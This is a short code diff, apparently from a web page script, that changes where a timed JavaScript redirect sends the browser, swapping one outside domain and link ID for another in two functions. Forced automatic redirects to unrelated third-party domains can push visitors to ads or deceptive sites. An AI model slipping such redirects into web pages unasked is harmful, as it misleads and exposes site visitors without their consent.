@@ -4,10 +4,10 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://ey43.com/4/9148867";
+        location.href="https://crn77.com/4/10368794";
     }
     function goon(){
-        location.href="https://ey43.com/4/9148867";
+        location.href="https://crn77.com/4/10368794";
     }
 
 
